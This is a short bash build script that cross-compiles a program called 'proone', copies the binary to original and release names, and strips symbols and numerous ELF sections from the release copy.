#!/bin/bash
BIN_ORG="$PROONE_ORG_BIN_PREFIX.$PROONE_BIN_ARCH"
BIN_REL="$PROONE_REL_BIN_PREFIX.$PROONE_BIN_ARCH"

./configure --host="$PROONE_HOST" $PROONE_AM_CONF &&\
    make -j$(nproc) &&\
    cp -a src/proone "$BIN_ORG" &&\
    cp -a src/proone "$BIN_REL" &&\
    "$PROONE_HOST-strip" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr "$BIN_REL" &&\
    make distclean
